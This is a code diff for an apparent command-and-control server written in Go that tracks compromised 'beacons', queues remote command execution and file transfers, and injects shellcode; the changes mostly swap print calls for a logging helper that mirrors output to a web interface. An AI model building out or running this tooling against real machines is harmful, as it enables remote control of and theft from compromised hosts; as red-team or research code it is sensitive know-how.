@@ -90,7 +90,7 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 	}
 
 	if beacon == nil || beacon.Ip == "n/a" {
-		fmt.Println("[+] New beacon " + updateData.Id + "@" + updateData.Ip)
+		info("[+] New beacon " + updateData.Id + "@" + updateData.Ip)
 		webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"New Beacon", updateData.Id + "@" + updateData.Ip})
 		beacon = &Beacon { updateData.Ip, updateData.Id, updateData.User, updateData.Platform, updateData.Arch, updateData.Pid, updateData.Pname, nil, nil, nil, nil, nil, time.Now() }
 		beacons = append(beacons, beacon)
@@ -110,7 +110,7 @@ func listBeacons() {
 				   "---------------------------------------------------------------------------------------------------------"
 	formatString := "%d\t%-12s\t%-15s\t%-15s\t%-15s\t%-8s\t%-5s\t%-15s\n"
 	
-	fmt.Println(header)
+	info(header)
 	for i, b := range beacons {
 		diff := time.Now().Sub(b.LastSeen)
 		status := convertTime(diff)
@@ -118,7 +118,7 @@ func listBeacons() {
 			status = " has not checked in yet."
 		}
 
-		fmt.Printf(formatString, i, b.Id, b.User, b.Ip, b.Pname, b.Platform, b.Arch, status)
+		info(fmt.Sprintf(formatString, i, b.Id, b.User, b.Ip, b.Pname, b.Platform, b.Arch, status))
 	}
 }
 
@@ -155,10 +155,10 @@ func execOnBeacon(cmd []string) {
 			return
 		} else {
 			beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[cmdIndex:], " "))
-			fmt.Println("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
+			info("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
 		}
 	} else {
-		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+		info("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
 	}
 }
 
@@ -179,9 +179,9 @@ func downloadFile(cmd []string) {
 
 	if beacon != nil {
 		beacon.DownloadBuffer = append(beacon.DownloadBuffer, cmd[cmdIndex])
-		fmt.Println("Added download command for beacon " + beacon.Id + "@" + beacon.Ip)
+		info("Added download command for beacon " + beacon.Id + "@" + beacon.Ip)
 	} else {
-		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+		info("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
 	}
 }
 
@@ -202,9 +202,9 @@ func uploadFile(cmd []string) {
 
 	if beacon != nil {
 		beacon.UploadBuffer = append(beacon.UploadBuffer, cmd[cmdIndex])
-		fmt.Println("Added upload command for beacon " + beacon.Id + "@" + beacon.Ip)
+		info("Added upload command for beacon " + beacon.Id + "@" + beacon.Ip)
 	} else {
-		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+		info("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
 	}
 }
 
@@ -237,9 +237,9 @@ func checkArgs(cmd[] string) (bool) {
 	amt := strings.Count(cmdArgs[cmd[0]], "<")
 	if len(cmd[1:]) != amt && !strings.Contains(cmdArgs[cmd[0]], "...") {
 		if amt == 1 {
-			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
+			info(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
 		} else {
-			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " args: " + cmdArgs[cmd[0]])
+			info(cmd[0] + " requires " + strconv.Itoa(amt) + " args: " + cmdArgs[cmd[0]])
 		}
 		return false
 	}
@@ -249,13 +249,13 @@ func checkArgs(cmd[] string) (bool) {
 func printHelp(cmd []string) {
 	if len(cmd) == 2 {
 		if val, ok := cmdArgs[cmd[1]]; ok {
-			fmt.Println(cmd[1] + " usage: " + strings.ReplaceAll(val, "...", ""))
+			info(cmd[1] + " usage: " + strings.ReplaceAll(val, "...", ""))
 		} else {
-			fmt.Println("Command " + cmd[0] + " does not exist.")
+			info("Command " + cmd[0] + " does not exist.")
 		}
 	} else {
 		for key, val := range cmdArgs {
-			fmt.Println(key + " " + strings.ReplaceAll(val, "...", ""))
+			info(key + " " + strings.ReplaceAll(val, "...", ""))
 		}
 	}
 }
@@ -264,7 +264,7 @@ func startHttpListener(cmd []string) {
 	port, err := strconv.Atoi(cmd[3])
 
 	if err != nil {
-		fmt.Println("usage: " + cmdArgs["httplistener"])
+		info("usage: " + cmdArgs["httplistener"])
 		return
 	}
 
@@ -276,23 +276,23 @@ func startHttpListener(cmd []string) {
 
 	err = HttpListener.startListener()
 	if err != nil {
-		fmt.Println("Failed to start http server.")
+		info("Failed to start http server.")
 	}
 
-	fmt.Println("Started HTTP listener for " + getIfaceIp(HttpListener.Iface) + ":" + cmd[3])
+	info("Started HTTP listener for " + getIfaceIp(HttpListener.Iface) + ":" + cmd[3])
 	listeners = append(listeners, &HttpListener)
 }
 
 func listListeners() {
-	fmt.Println("---- HTTP Listeners ----")
+	info("---- HTTP Listeners ----")
 	for i, listener := range listeners {
-		fmt.Println("[" + strconv.Itoa(i) + "] " + getIfaceIp(listener.Iface) + ":" + strconv.Itoa(listener.Port) + " (" + listener.Iface + ")")
+		info("[" + strconv.Itoa(i) + "] " + getIfaceIp(listener.Iface) + ":" + strconv.Itoa(listener.Port) + " (" + listener.Iface + ")")
 	}
 }
 
 func migrateBeacon(cmd []string) {
 	if activeBeacon == nil {
-		fmt.Println("Interact with a beacon first (use).")
+		info("Interact with a beacon first (use).")
 		return
 	}
 
@@ -305,7 +305,7 @@ func migrateBeacon(cmd []string) {
 	filename += ".bin"
 
 	if _, err := os.Stat(filename); os.IsNotExist(err) {
-		fmt.Println("File does not exist.")
+		info("File does not exist.")
 		return
 	}
 
@@ -319,16 +319,16 @@ func migrateBeacon(cmd []string) {
 
 func injectShellcode(cmd []string) {
 	if activeBeacon == nil {
-		fmt.Println("Interact with a beacon first (use).")
+		info("Interact with a beacon first (use).")
 		return
 	}
 
 	if _, err := os.Stat(cmd[1]); os.IsNotExist(err) {
-		fmt.Println("File does not exist.")
+		info("File does not exist.")
 		return
 	}
 
-	fmt.Println(cmd[0], cmd[1])
+	info(cmd[0], cmd[1])
 	f, _ := os.Open(cmd[1])
     reader := bufio.NewReader(f)
     content, _ := ioutil.ReadAll(reader)
@@ -342,7 +342,7 @@ func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
 	data, err := json.Marshal(pseudoBeacon)
 	
 	if err != nil {
-		fmt.Println("Failed to notify beacon of proxy update.")
+		info("Failed to notify beacon of proxy update.")
 		return
 	}
 
@@ -376,14 +376,19 @@ func processInput(input string) {
 			case "create":
 				l, err := strconv.Atoi(cmd[1])
 				if err != nil {
-					fmt.Println("usage: " + cmdArgs["create"])
+					info("usage: " + cmdArgs["create"])
 					return
 				}
 				if len(listeners) <= l || l < 0 {
-					fmt.Println("Listener " + cmd[1] + " does not exist, list existing listeners with 'listeners'")
+					info("Listener " + cmd[1] + " does not exist, list existing listeners with 'listeners'")
 					return
 				}
-				createBeacon(l)
+				
+				go func() {
+					redirectStdIn = true
+					createBeacon(l)
+					redirectStdIn = false
+				}()
 			case "list":
 				listBeacons()
 			case "upload":
@@ -393,7 +398,7 @@ func processInput(input string) {
 			case "use":
 				activeBeacon = getBeaconByIdOrIndex(cmd[1])
 				if activeBeacon == nil {
-					fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+					info("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
 				}
 			case "shellcode":
 				injectShellcode(cmd)
@@ -405,10 +410,10 @@ func processInput(input string) {
 				if activeBeacon != nil {
 					execOnBeacon(append(cmd, "plist"))
 				} else {
-					fmt.Println("Interact with a beacon first (use).")
+					info("Interact with a beacon first (use).")
 				}
 			default:
-				fmt.Println(cmd[0] + " is not a command. Use help to show available commands.")
+				info(cmd[0] + " is not a command. Use help to show available commands.")
 			}
 		}
 	}
@@ -439,6 +444,28 @@ func handleInput() {
 	}
 }
 
+func appendStdoutBuffers(out string) {
+	for client := range hub.clients {
+		client.cmdBuffer += out
+	}
+}
+
+func info(info ...string) {
+	for _, s := range info  {
+		fmt.Println("[+] " + s)
+		appendStdoutBuffers(s + "\n")
+	}
+}
+
+func infof(info string, f ...string) {
+	fmt.Printf(info)
+	appendStdoutBuffers(info)
+}
+
+func readLine() string {
+	return <-terminalPipe
+}
+
 func main() {
 	var WebInterface = WebInterface {
 		port: 8000,
@@ -446,7 +473,7 @@ func main() {
 
 	var err = WebInterface.startListener()
 	if err != nil {
-		fmt.Println("Failed to start web interface.")
+		info("Failed to start web interface.")
 	}
 
 	//var HttpListenerTun0 = HttpListener {
@@ -463,33 +490,15 @@ func main() {
 
 	//err = HttpListenerTun0.startListener()
 	//if err != nil {
-	//	fmt.Println("Failed to start http server.")
+	//	info("Failed to start http server.")
 	//}
 
 	err = HttpListenerLocalhost.startListener()
 	if err != nil {
-		fmt.Println("Failed to start http server.")
+		info("Failed to start http server.")
 	}
 
 	//listeners = append(listeners, &HttpListenerTun0)
 	listeners = append(listeners, &HttpListenerLocalhost)
-
-	go func() {
-		for {
-			rescueStdout := os.Stdout
-			stdOutHook, wr, _ := os.Pipe()
-			os.Stdout = wr
-			time.Sleep(time.Millisecond * 20)
-			wr.Close()
-			out, _ := ioutil.ReadAll(stdOutHook)
-			os.Stdout = rescueStdout
-			
-			if(len(out) > 0) {
-				stdOutBuffer = append(stdOutBuffer, []byte(strings.ReplaceAll(string(out), "c2> ", ""))...)
-				fmt.Print(string(out))
-			}
-		}
-	}()
-
 	handleInput()
 }
